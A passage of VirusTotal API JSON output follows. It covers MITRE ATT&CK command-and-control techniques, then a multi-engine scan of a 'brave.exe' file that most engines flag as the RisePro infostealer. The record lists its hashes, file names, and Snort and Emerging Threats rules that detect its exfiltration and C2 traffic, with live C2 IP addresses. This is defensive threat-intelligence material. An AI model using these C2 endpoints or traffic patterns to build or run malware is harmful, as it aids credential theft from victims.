                "description": "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Downloads files from webservers via HTTP"
                  },
                  {
                    "severity": "INFO",
                    "description": "Posts data to webserver"
                  },
                  {
                    "severity": "INFO",
                    "description": "Tries to download or post to a non-existing HTTP route (HTTP/1.1 404 Not Found / 503 Service Unavailable)"
                  },
                  {
                    "severity": "INFO",
                    "description": "Performs DNS lookups"
                  }
                ]
              },
              {
                "id": "T1071",
                "name": "Application Layer Protocol",
                "link": "https://attack.mitre.org/techniques/T1071/",
                "description": "Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Downloads files from webservers via HTTP"
                  },
                  {
                    "severity": "INFO",
                    "description": "Posts data to webserver"
                  },
                  {
                    "severity": "INFO",
                    "description": "Tries to download or post to a non-existing HTTP route (HTTP/1.1 404 Not Found / 503 Service Unavailable)"
                  },
                  {
                    "severity": "INFO",
                    "description": "Performs DNS lookups"
                  },
                  {
                    "severity": "INFO",
                    "description": "Uses HTTPS"
                  },
                  {
                    "severity": "INFO",
                    "description": "Downloads executable code via HTTP"
                  }
                ]
              }
            ]
          }
        ]
      }
    },
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/2f7f23610e8e0633ef0b03d602a02734bdcadab3fdc8c15d0f6d93a0a454fa6f/behaviour_mitre_trees"
    }
  }
},
{
  "_id": {
    "$oid": "65bac7af0e994d74c761c8a7"
  },
  "data": {
    "id": "5cf41546232059b45ae02f5aacccf38e7efd99e122414dbeceea2a85b16a38c1",
    "type": "file",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/5cf41546232059b45ae02f5aacccf38e7efd99e122414dbeceea2a85b16a38c1"
    },
    "attributes": {
      "meaningful_name": "brave.exe",
      "type_extension": "exe",
      "last_analysis_results": {
        "Bkav": {
          "method": "blacklist",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "W32.AIDetectMalware"
        },
        "Lionic": {
          "method": "blacklist",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan.Win32.RisePro.i!c"
        },
        "tehtris": {
          "method": "blacklist",
          "engine_name": "tehtris",
          "engine_version": "v0.1.4-109-g76614fd",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Generic.Malware"
        },
        "Cynet": {
          "method": "blacklist",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.29",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Malicious (score: 100)"
        },
        "FireEye": {
          "method": "blacklist",
          "engine_name": "FireEye",
          "engine_version": "35.47.0.0",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Generic.mg.b836fbb7d19fbebf"
        },
        "CAT-QuickHeal": {
          "method": "blacklist",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "engine_update": "20240130",
          "category": "malicious",
          "result": "Trojanpws.Risepro"
        },
        "Skyhigh": {
          "method": "blacklist",
          "engine_name": "Skyhigh",
          "engine_version": "v2021.2.0+4045",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "BehavesLike.Win32.Trojan.vc"
        },
        "McAfee": {
          "method": "blacklist",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Artemis!B836FBB7D19F"
        },
        "Cylance": {
          "method": "blacklist",
          "engine_name": "Cylance",
          "engine_version": "2.0.0.0",
          "engine_update": "20240103",
          "category": "malicious",
          "result": "unsafe"
        },
        "Zillya": {
          "method": "blacklist",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.5043",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Sangfor": {
          "method": "blacklist",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "engine_update": "20240129",
          "category": "malicious",
          "result": "Infostealer.Win32.Risepro.V1fh"
        },
        "K7AntiVirus": {
          "method": "blacklist",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.139.50921",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan ( 0040f4ef1 )"
        },
        "Alibaba": {
          "method": "blacklist",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "engine_update": "20190527",
          "category": "malicious",
          "result": "TrojanPSW:Win32/RisePro.2a887869"
        },
        "K7GW": {
          "method": "blacklist",
          "engine_name": "K7GW",
          "engine_version": "12.139.50921",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan ( 0040f4ef1 )"
        },
        "Cybereason": {
          "method": "blacklist",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "engine_update": "20231102",
          "category": "malicious",
          "result": "malicious.26bc41"
        },
        "BitDefenderTheta": {
          "method": "blacklist",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "engine_update": "20240103",
          "category": "malicious",
          "result": "Gen:NN.ZexaF.36680.qA0aa4T9hsek"
        },
        "VirIT": {
          "method": "blacklist",
          "engine_name": "VirIT",
          "engine_version": "9.5.630",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan.Win32.Genus.VAJ"
        },
        "Symantec": {
          "method": "blacklist",
          "engine_name": "Symantec",
          "engine_version": "1.21.0.0",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "ML.Attribute.HighConfidence"
        },
        "Elastic": {
          "method": "blacklist",
          "engine_name": "Elastic",
          "engine_version": "4.0.125",
          "engine_update": "20240115",
          "category": "malicious",
          "result": "malicious (high confidence)"
        },
        "ESET-NOD32": {
          "method": "blacklist",
          "engine_name": "ESET-NOD32",
          "engine_version": "28661",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "a variant of Win32/Packed.Themida.HZB"
        },
        "APEX": {
          "method": "blacklist",
          "engine_name": "APEX",
          "engine_version": "6.495",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Malicious"
        },
        "Paloalto": {
          "method": "blacklist",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "ClamAV": {
          "method": "blacklist",
          "engine_name": "ClamAV",
          "engine_version": "1.2.1.0",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Kaspersky": {
          "method": "blacklist",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan-PSW.Win32.RisePro.bnq"
        },
        "BitDefender": {
          "method": "blacklist",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan.GenericKD.71375383"
        },
        "NANO-Antivirus": {
          "method": "blacklist",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25796",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "SUPERAntiSpyware": {
          "method": "blacklist",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "MicroWorld-eScan": {
          "method": "blacklist",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan.GenericKD.71375383"
        },
        "Avast": {
          "method": "blacklist",
          "engine_name": "Avast",
          "engine_version": "23.9.8494.0",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Win32:TrojanX-gen [Trj]"
        },
        "Tencent": {
          "method": "blacklist",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Malware.Win32.Gencirc.13ff2bc8"
        },
        "TACHYON": {
          "method": "blacklist",
          "engine_name": "TACHYON",
          "engine_version": "2024-01-31.02",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Sophos": {
          "method": "blacklist",
          "engine_name": "Sophos",
          "engine_version": "2.4.3.0",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Mal/Generic-S"
        },
        "Baidu": {
          "method": "blacklist",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "engine_update": "20190318",
          "category": "undetected",
          "result": null
        },
        "F-Secure": {
          "method": "blacklist",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1547.307",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Heuristic.HEUR/AGEN.1366178"
        },
        "DrWeb": {
          "method": "blacklist",
          "engine_name": "DrWeb",
          "engine_version": "7.0.61.8090",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan.Siggen25.4504"
        },
        "VIPRE": {
          "method": "blacklist",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan.GenericKD.71375383"
        },
        "Trapmine": {
          "method": "blacklist",
          "engine_name": "Trapmine",
          "engine_version": "4.0.14.97",
          "engine_update": "20231106",
          "category": "malicious",
          "result": "malicious.high.ml.score"
        },
        "CMC": {
          "method": "blacklist",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "engine_update": "20240129",
          "category": "undetected",
          "result": null
        },
        "Emsisoft": {
          "method": "blacklist",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan.GenericKD.71375383 (B)"
        },
        "Ikarus": {
          "method": "blacklist",
          "engine_name": "Ikarus",
          "engine_version": "6.2.4.0",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan.Win32.Themida"
        },
        "GData": {
          "method": "blacklist",
          "engine_name": "GData",
          "engine_version": "A:25.37269B:27.34762",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan.GenericKD.71375383"
        },
        "Webroot": {
          "method": "blacklist",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "W32.Trojan.Gen"
        },
        "Varist": {
          "method": "blacklist",
          "engine_name": "Varist",
          "engine_version": "6.5.1.2",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "W32/ABRisk.ARUD-1866"
        },
        "Avira": {
          "method": "blacklist",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "HEUR/AGEN.1366178"
        },
        "Antiy-AVL": {
          "method": "blacklist",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan[Packed]/Win32.Themida"
        },
        "Kingsoft": {
          "method": "blacklist",
          "engine_name": "Kingsoft",
          "engine_version": "None",
          "engine_update": "20230906",
          "category": "malicious",
          "result": "Win32.HeurC.KVMH008.a"
        },
        "Gridinsoft": {
          "method": "blacklist",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.158.174",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Ransom.Win32.Sabsik.ns"
        },
        "Xcitium": {
          "method": "blacklist",
          "engine_name": "Xcitium",
          "engine_version": "36395",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Malware@#3pdc98rf7hnf7"
        },
        "Arcabit": {
          "method": "blacklist",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan.Generic.D4411A17"
        },
        "ViRobot": {
          "method": "blacklist",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "ZoneAlarm": {
          "method": "blacklist",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan-PSW.Win32.RisePro.bnq"
        },
        "Microsoft": {
          "method": "blacklist",
          "engine_name": "Microsoft",
          "engine_version": "1.1.23110.2",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan:Win32/Leonem"
        },
        "Google": {
          "method": "blacklist",
          "engine_name": "Google",
          "engine_version": "1706725931",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Detected"
        },
        "AhnLab-V3": {
          "method": "blacklist",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.25.0.10459",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan/Win.TrojanX-gen.C5580628"
        },
        "Acronis": {
          "method": "blacklist",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.121",
          "engine_update": "20230828",
          "category": "undetected",
          "result": null
        },
        "ALYac": {
          "method": "blacklist",
          "engine_name": "ALYac",
          "engine_version": "2.0.0.8",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan.GenericKD.71375383"
        },
        "MAX": {
          "method": "blacklist",
          "engine_name": "MAX",
          "engine_version": "2023.1.4.1",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "malware (ai score=85)"
        },
        "Malwarebytes": {
          "method": "blacklist",
          "engine_name": "Malwarebytes",
          "engine_version": "4.5.5.54",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Spyware.RisePro"
        },
        "Panda": {
          "method": "blacklist",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trj/Chgt.AD"
        },
        "Zoner": {
          "method": "blacklist",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Probably Heur.ExeHeaderL"
        },
        "Rising": {
          "method": "blacklist",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan.Generic@AI.100 (RDML:11qhH4oCeXepxlijPs976w)"
        },
        "Yandex": {
          "method": "blacklist",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "SentinelOne": {
          "method": "blacklist",
          "engine_name": "SentinelOne",
          "engine_version": "24.1.0.5",
          "engine_update": "20240129",
          "category": "malicious",
          "result": "Static AI - Malicious PE"
        },
        "MaxSecure": {
          "method": "blacklist",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Fortinet": {
          "method": "blacklist",
          "engine_name": "Fortinet",
          "engine_version": "None",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "W32/PossibleThreat"
        },
        "AVG": {
          "method": "blacklist",
          "engine_name": "AVG",
          "engine_version": "23.9.8494.0",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Win32:TrojanX-gen [Trj]"
        },
        "DeepInstinct": {
          "method": "blacklist",
          "engine_name": "DeepInstinct",
          "engine_version": "5.0.0.8",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "MALICIOUS"
        },
        "CrowdStrike": {
          "method": "blacklist",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "engine_update": "20231026",
          "category": "malicious",
          "result": "win/malicious_confidence_100% (W)"
        },
        "TrendMicro-HouseCall": {
          "method": "blacklist",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "engine_update": "20240131",
          "category": "timeout",
          "result": null
        },
        "TrendMicro": {
          "method": "blacklist",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "engine_update": "20240131",
          "category": "timeout",
          "result": null
        },
        "VBA32": {
          "method": "blacklist",
          "engine_name": "VBA32",
          "engine_version": null,
          "engine_update": "20240131",
          "category": "timeout",
          "result": null
        },
        "Jiangmin": {
          "method": "blacklist",
          "engine_name": "Jiangmin",
          "engine_version": null,
          "engine_update": "20240130",
          "category": "failure",
          "result": null
        },
        "Avast-Mobile": {
          "method": "blacklist",
          "engine_name": "Avast-Mobile",
          "engine_version": "240131-00",
          "engine_update": "20240131",
          "category": "type-unsupported",
          "result": null
        },
        "SymantecMobileInsight": {
          "method": "blacklist",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "engine_update": "20240103",
          "category": "type-unsupported",
          "result": null
        },
        "BitDefenderFalx": {
          "method": "blacklist",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "engine_update": "20240128",
          "category": "type-unsupported",
          "result": null
        },
        "Trustlook": {
          "method": "blacklist",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "engine_update": "20240131",
          "category": "type-unsupported",
          "result": null
        }
      },
      "sha1": "6b2641226bc419b124bf35b2c546fac9bb31641b",
      "vhash": "02606f7d7d1f1f7f11z17z1!z",
      "tlsh": "T145B533E59972D64AC083B3BA5010ECA355F31D538AA166AD2A58F3774FFF13A52ECD00",
      "total_votes": {
        "harmless": 0,
        "malicious": 0
      },
      "first_submission_date": 1706473232,
      "magic": "PE32 executable (GUI) Intel 80386, for MS Windows",
      "detectiteasy": {
        "filetype": "PE32",
        "values": [
          {
            "version": "1.XX-2.XX",
            "type": "Protector",
            "name": "Themida/Winlicense"
          },
          {
            "info": "LTCG/C++",
            "version": "19.34.31947",
            "type": "Compiler",
            "name": "Microsoft Visual C/C++"
          },
          {
            "version": "14.34.31947",
            "type": "Linker",
            "name": "Microsoft Linker"
          },
          {
            "version": "2022 version 17.4",
            "type": "Tool",
            "name": "Visual Studio"
          }
        ]
      },
      "times_submitted": 7,
      "md5": "b836fbb7d19fbebfdca677bf883d7370",
      "last_modification_date": 1706736230,
      "type_tags": [
        "executable",
        "windows",
        "win32",
        "pe",
        "peexe"
      ],
      "sha256": "5cf41546232059b45ae02f5aacccf38e7efd99e122414dbeceea2a85b16a38c1",
      "last_submission_date": 1706533593,
      "authentihash": "7615c5385d0bf62a0d16d8b3d53e9453ccae9b1c4c80fe4ece216172411f6c32",
      "names": [
        "brave.exe",
        "5cf41546232059b45ae02f5aacccf38e7efd99e122414dbeceea2a85b16a38c1.exe",
        "RageMP131.exe",
        "mpgph131.exe",
        "ra3emhjurfni0jfql99h.exe",
        "lada[1].exe"
      ],
      "last_analysis_stats": {
        "malicious": 56,
        "suspicious": 0,
        "undetected": 12,
        "harmless": 0,
        "timeout": 3,
        "confirmed-timeout": 0,
        "failure": 1,
        "type-unsupported": 4
      },
      "crowdsourced_ids_stats": {
        "high": 14,
        "info": 1,
        "medium": 4,
        "low": 10
      },
      "crowdsourced_ids_results": [
        {
          "rule_category": "policy-violation",
          "alert_severity": "high",
          "rule_msg": "FILE-EXECUTABLE download of executable content",
          "rule_raw": "alert tcp $EXTERNAL_NET $HTTP_PORTS -> $HOME_NET any ( msg:\"FILE-EXECUTABLE download of executable content\"; flow:to_client,established; http_header; content:\"application/octet-stream\",fast_pattern,nocase; pcre:\"/^Content-Type\\x3a[\\x20\\x09]+application\\/octet-stream/ims\"; file_data; content:\"MZ\",within 2; metadata:policy max-detect-ips drop; service:http; reference:url,www.microsoft.com/smallbusiness/resources/technology/security/practice_safe_computing_and_thwart_online_thugs.mspx; classtype:policy-violation; sid:11192; rev:20; )",
          "alert_context": [
            {
              "src_ip": "109.107.182.3",
              "src_port": 80
            }
          ],
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "rule_source": "Snort registered user ruleset",
          "rule_references": [
            "https://www.microsoft.com/smallbusiness/resources/technology/security/practice_safe_computing_and_thwart_online_thugs.mspx"
          ],
          "rule_id": "1:11192"
        },
        {
          "rule_category": "policy-violation",
          "alert_severity": "high",
          "rule_msg": "FILE-EXECUTABLE Portable Executable binary file magic detected",
          "rule_raw": "alert tcp $EXTERNAL_NET $FILE_DATA_PORTS -> $HOME_NET any ( msg:\"FILE-EXECUTABLE Portable Executable binary file magic detected\"; flow:to_client,established; file_data; content:\"MZ\"; byte_jump:4,58,relative,little; content:\"PE|00 00|\",within 4,distance -64; metadata:policy max-detect-ips drop; service:ftp-data,http,imap,pop3; classtype:policy-violation; sid:15306; rev:22; )",
          "alert_context": [
            {
              "src_ip": "109.107.182.3",
              "src_port": 80
            }
          ],
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "rule_source": "Snort registered user ruleset",
          "rule_id": "1:15306"
        },
        {
          "rule_category": "A Network Trojan was detected",
          "alert_severity": "high",
          "rule_msg": "ET MALWARE Win32/Amadey Host Fingerprint Exfil (POST) M2",
          "rule_raw": "alert http $HOME_NET any -> $EXTERNAL_NET any (msg:\"ET MALWARE Win32/Amadey Host Fingerprint Exfil (POST) M2\"; flow:established,to_server; http.method; content:\"POST\"; http.uri; content:\".php\"; endswith; http.request_body; bsize:31; content:\"d1=\"; startswith; pcre:\"/^(?:[0-9]{10})/R\"; content:\"&unit=\"; within:6; fast_pattern; pcre:\"/^(?:[0-9]{12})$/R\"; http.content_type; content:\"application|2f|x|2d|www|2d|form|2d|urlencoded\"; http.header_names; content:!\"Referer\"; reference:url,twitter.com/0xToxin/status/1637786881780850688; classtype:trojan-activity; sid:2044696; rev:1; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, created_at 2023_03_20, deployment Perimeter, former_category MALWARE, signature_severity Major, updated_at 2023_03_20;)",
          "alert_context": [
            {
              "url": "http://185.215.113.68/theme/index.php",
              "hostname": "185.215.113.68",
              "dest_port": 80,
              "dest_ip": "185.215.113.68"
            }
          ],
          "rule_url": "https://rules.emergingthreats.net/",
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_references": [
            "https://twitter.com/0xToxin/status/1637786881780850688"
          ],
          "rule_id": "1:2044696"
        },
        {
          "rule_category": "Malware Command and Control Activity Detected",
          "alert_severity": "high",
          "rule_msg": "ET MALWARE [ANY.RUN] RisePro TCP v.0.x (Token)",
          "rule_raw": "alert tcp $EXTERNAL_NET ![80,443,5938] -> $HOME_NET any (msg:\"ET MALWARE [ANY.RUN] RisePro TCP v.0.x (Token)\"; flow:established,to_client; stream_size:server,=,37; dsize:36; content:\"|18 00 00 00 12 27 00 00|\"; offset:4; depth:8; reference:md5,a1f3423e231abd59d45b2ec37f751bbc; reference:url,app.any.run/tasks/d4c145cc-6a2d-4512-9cd6-555f0f2e17ed; classtype:command-and-control; sid:2046266; rev:2; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, created_at 2023_06_14, deployment Perimeter, former_category MALWARE, malware_family RisePro, performance_impact Low, confidence High, signature_severity Major, updated_at 2023_06_16, reviewed_at 2023_08_21; target:dest_ip;)",
          "alert_context": [
            {
              "src_ip": "193.233.132.62",
              "src_port": 50500
            }
          ],
          "rule_url": "https://rules.emergingthreats.net/",
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_references": [
            "https://www.virustotal.com/gui/search/a1f3423e231abd59d45b2ec37f751bbc",
            "https://app.any.run/tasks/d4c145cc-6a2d-4512-9cd6-555f0f2e17ed"
          ],
          "rule_id": "1:2046266"
        },
        {
          "rule_category": "Malware Command and Control Activity Detected",
          "alert_severity": "high",
          "rule_msg": "ET MALWARE [ANY.RUN] RisePro TCP v.0.x (External IP)",
          "rule_raw": "alert tcp $EXTERNAL_NET ![80,443,5938] -> $HOME_NET any (msg:\"ET MALWARE [ANY.RUN] RisePro TCP v.0.x (External IP)\"; flow:established,to_client; dsize:19<>29; content:\"|00 00 00 21 27 00 00|\"; offset:5; depth:8; reference:md5,a1f3423e231abd59d45b2ec37f751bbc; reference:url,app.any.run/tasks/d4c145cc-6a2d-4512-9cd6-555f0f2e17ed; classtype:command-and-control; sid:2046267; rev:2; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, created_at 2023_06_14, deployment Perimeter, former_category MALWARE, malware_family RisePro, performance_impact Low, confidence High, signature_severity Major, updated_at 2023_06_16, reviewed_at 2023_08_21; target:dest_ip;)",
          "alert_context": [
            {
              "src_ip": "193.233.132.62",
              "src_port": 50500
            }
          ],
          "rule_url": "https://rules.emergingthreats.net/",
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_references": [
            "https://www.virustotal.com/gui/search/a1f3423e231abd59d45b2ec37f751bbc",
            "https://app.any.run/tasks/d4c145cc-6a2d-4512-9cd6-555f0f2e17ed"
          ],
          "rule_id": "1:2046267"
        },
        {
          "rule_category": "Malware Command and Control Activity Detected",
          "alert_severity": "high",
          "rule_msg": "ET MALWARE [ANY.RUN] RisePro TCP v.0.x (Activity)",
          "rule_raw": "alert tcp $HOME_NET any -> $EXTERNAL_NET ![80,443,5938] (msg:\"ET MALWARE [ANY.RUN] RisePro TCP v.0.x (Activity)\"; flow:established,to_server; dsize:12; content:\"|00 00 00 00 10 27 00 00|\"; offset:4; depth:8; reference:md5,a1f3423e231abd59d45b2ec37f751bbc; reference:url,app.any.run/tasks/d4c145cc-6a2d-4512-9cd6-555f0f2e17ed; classtype:command-and-control; sid:2046269; rev:2; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, created_at 2023_06_14, deployment Perimeter, former_category MALWARE, malware_family RisePro, performance_impact Low, confidence High, signature_severity Major, updated_at 2023_06_16, reviewed_at 2023_08_21; target:src_ip;)",
          "alert_context": [
            {
              "dest_port": 50500,
              "dest_ip": "193.233.132.62"
            }
          ],
          "rule_url": "https://rules.emergingthreats.net/",
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_references": [
            "https://www.virustotal.com/gui/search/a1f3423e231abd59d45b2ec37f751bbc",
            "https://app.any.run/tasks/d4c145cc-6a2d-4512-9cd6-555f0f2e17ed"
          ],
          "rule_id": "1:2046269"
        },
        {
          "rule_category": "Malware Command and Control Activity Detected",
          "alert_severity": "high",
          "rule_msg": "ET MALWARE [ANY.RUN] RisePro TCP v.0.x (Exfiltration)",
          "rule_raw": "alert tcp $HOME_NET any -> $EXTERNAL_NET ![80,443,445,5938] (msg:\"ET MALWARE [ANY.RUN] RisePro TCP v.0.x (Exfiltration)\"; flow:established,to_server; dsize:>1100; content:\"|00 1F 27 00 00|\"; offset:7; depth:5; reference:md5,a1f3423e231abd59d45b2ec37f751bbc; reference:url,app.any.run/tasks/d4c145cc-6a2d-4512-9cd6-555f0f2e17ed; classtype:command-and-control; sid:2046270; rev:3; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, created_at 2023_06_14, deployment Perimeter, former_category MALWARE, malware_family RisePro, performance_impact Low, confidence High, signature_severity Major, updated_at 2023_06_23, reviewed_at 2023_10_06; target:src_ip;)",
          "alert_context": [
            {
              "dest_port": 50500,
              "dest_ip": "193.233.132.62"
            }
          ],
          "rule_url": "https://rules.emergingthreats.net/",
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_references": [
            "https://www.virustotal.com/gui/search/a1f3423e231abd59d45b2ec37f751bbc",
            "https://app.any.run/tasks/d4c145cc-6a2d-4512-9cd6-555f0f2e17ed"
          ],
          "rule_id": "1:2046270"
        },
        {
          "rule_category": "A Network Trojan was detected",
          "alert_severity": "high",
          "rule_msg": "ET MALWARE Suspected RisePro TCP Heartbeat Packet",
          "rule_raw": "alert tcp-pkt $HOME_NET any -> $EXTERNAL_NET 1024: (msg:\"ET MALWARE Suspected RisePro TCP Heartbeat Packet\"; flow:established,to_server; dsize:11<>16; content:\"|ad da ba ab|\"; startswith; fast_pattern; content:\"|27 00 00|\"; distance:5; within:3; threshold:type both,track by_src, count 1, seconds 30; reference:md5,dbd32d02e980ceffdce16697edd62673; classtype:trojan-activity; sid:2049060; rev:1; metadata:attack_target Client_Endpoint, created_at 2023_11_03, deployment Perimeter, former_category MALWARE, performance_impact Low, confidence Medium, signature_severity Major, updated_at 2023_11_03, reviewed_at 2023_11_03; target:src_ip;)",
          "alert_context": [
            {
              "dest_port": 50500,
              "dest_ip": "193.233.132.62"
            }
          ],
          "rule_url": "https://rules.emergingthreats.net/",
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_references": [
            "https://www.virustotal.com/gui/search/dbd32d02e980ceffdce16697edd62673"
          ],
          "rule_id": "1:2049060"
        },
        {
          "rule_category": "attempted-user",
          "alert_severity": "high",
          "rule_msg": "FILE-OTHER heapspray characters detected - binary",
          "rule_raw": "alert tcp $EXTERNAL_NET $FILE_DATA_PORTS -> $HOME_NET any ( msg:\"FILE-OTHER heapspray characters detected - binary\"; flow:to_client,established; flowbits:isnotset,file.jpeg; file_data; content:\"|0C 0C 0C 0C 0C 0C 0C 0C|\",fast_pattern,nocase; metadata:policy max-detect-ips drop; service:ftp-data,http,imap,pop3; classtype:attempted-user; sid:23861; rev:11; )",
          "alert_context": [
            {
              "src_ip": "109.107.182.3",
              "src_port": 80
            }
          ],
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "rule_source": "Snort registered user ruleset",
          "rule_id": "1:23861"
        },
        {
          "rule_category": "attempted-user",
          "alert_severity": "high",
          "rule_msg": "FILE-MULTIMEDIA Microsoft Windows Transport Stream Program Map Table Heap overflow attempt",
